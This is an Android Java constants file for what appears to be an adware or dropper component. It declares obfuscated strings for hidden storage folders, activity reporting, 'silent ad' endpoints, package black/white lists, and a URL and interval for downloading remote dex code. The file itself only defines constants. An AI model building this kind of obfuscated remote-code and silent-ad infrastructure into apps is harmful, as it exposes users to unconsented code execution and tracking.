package com.curtain.koreyoshi.init;

import android.os.Environment;

import com.common.crypt.ByteCrypt;
import com.curtain.arch.MyLog;

/**
 * Created by lijichuan on 15/11/2.
 */
public class Constants {
    public static long MINUTE = 60 * 1000;
    public static long HOUR = MyLog.isDebug() ? MINUTE : 60 * MINUTE;
    public static long DAY = MyLog.isDebug() ? MINUTE : 24 * HOUR;
    public static long MONTH = 30 * DAY;
    public static long WRITE_TIME_UNIT = 3*1000;

    //包安装的广播意图
    public static final String MY_PACKAGE_ADDED_ACTION = ByteCrypt.getString("my.intent.action.PACKAGE_ADDED".getBytes());//[config]=PACKAGE_ADD_ACTION

    public static final String PINKU_PACKAGE_ADDED_ACTION = ByteCrypt.getString("com.ibingo.intent.broadcast.INSTALL_COMPLETED".getBytes());

    public static String ALARM_TRIGGER_ACTION = ByteCrypt.getString("com.curtain.action.ALARM_TRIGGER".getBytes());

    public static final String MY_DOWNLOAD_COMPLETE_ACTION = ByteCrypt.getString("my.intent.action.DOWNLOAD_COMPLETE".getBytes());

    //点击下载通知栏的广播意图
    public static final String NOTITY_ID = ByteCrypt.getString("notify_id".getBytes());
   public static final String DOWNLOAD_NOTIFICATION_CLICKED = ByteCrypt.getString("my.intent.action.DOWNLOAD_NOTIFICATION_CLICKED".getBytes());//[config]=NOTI_CLICKED_ACTION

    //需要重试的异常信息
    public static final String CONNECT_TIMEOUT_EX = ByteCrypt.getString("org.apache.http.conn.ConnectTimeoutException".getBytes());
    public static final String UNKNOW_HOST_EX = ByteCrypt.getString("java.net.UnknownHostException".getBytes());
    //文件路径
    public static final String FOLDER_ROOT = Environment.getExternalStorageDirectory().getAbsolutePath()+
            ByteCrypt.getString("/Juice".getBytes());
    public static final String SERIALIZABLE_SAVE_DIR = FOLDER_ROOT+
            ByteCrypt.getString("/seria".getBytes());
    public static final String DOWNLOAD_DIR = FOLDER_ROOT +
            ByteCrypt.getString("/backup/".getBytes());
    public static final String IMAGE_DOWNLOAD_DIR = FOLDER_ROOT +
            ByteCrypt.getString("/pic/".getBytes());
    public static final String LOG_DIR = FOLDER_ROOT +
            ByteCrypt.getString("/log/".getBytes());
    public static final String ERROR_DIR = FOLDER_ROOT +
            ByteCrypt.getString("/error/".getBytes());
    public static final String TEMP_FOLDER = FOLDER_ROOT +
            ByteCrypt.getString("/temp/".getBytes());

    //日活间隔
    public static final int ACTIVE_REPORT_TIME_INTERVAL = 7;

    //请求更新dex间隔
    public static final int REQUEST_UPDATE_TIME_INTERVAL = 8;

    //TODO TODO  对应ksmob集群
//[config]=INTERFACE_START
    //日活接口
    public static final String USER_BOOT_URL = ByteCrypt.getString("http://event.apiv8.com/event.php".getBytes());
    //策略接口
    public static final String REQUEST_STRATEGY_URL = ByteCrypt.getString("http://api.apiv8.com/api.php?sk=strategy".getBytes());
    //广告接口
    public static final String AD_REQUEST_URL_PREFIX = ByteCrypt.getString("http://api.apiv8.com/api.php".getBytes());
    //静默广告接口
    public static final String SILENT_AD_REQUEST_URL_PREFIX = ByteCrypt.getString("http://api.apiv8.com/api.php".getBytes());
    //事件接口
    public static final String EVENT_REPORT_URL = ByteCrypt.getString("http://event.apiv8.com/event.php".getBytes());
    //黑白名单接口
    public static final String NAME_LIST_REQUEST_URL = ByteCrypt.getString("http://api.apiv8.com/api.php?sk=packagelist".getBytes());
    //track失败接口
    public static final String REFER_FAIL_URL = ByteCrypt.getString("http://api.apiv8.com/api.php?sk=refer".getBytes());
    //dex更新接口
    public static final String UPDATEJAR_MESSAGE_URL = ByteCrypt.getString("http://api.apiv8.com/api.php?sk=pack&dvcode=".getBytes());
    //[config]=INTERFACE_END

    //新的策略接口
    public static final String REQUEST_BINGO_STRATEGY_URL = ByteCrypt.getString("http://54.169.115.237/kings-service/kings/config".getBytes());

//    public static final String REQUEST_BINGO_STRATEGY_URL = ByteCrypt.getString("http://192.168.1.198:9090/kings-service/kings/config".getBytes());



}
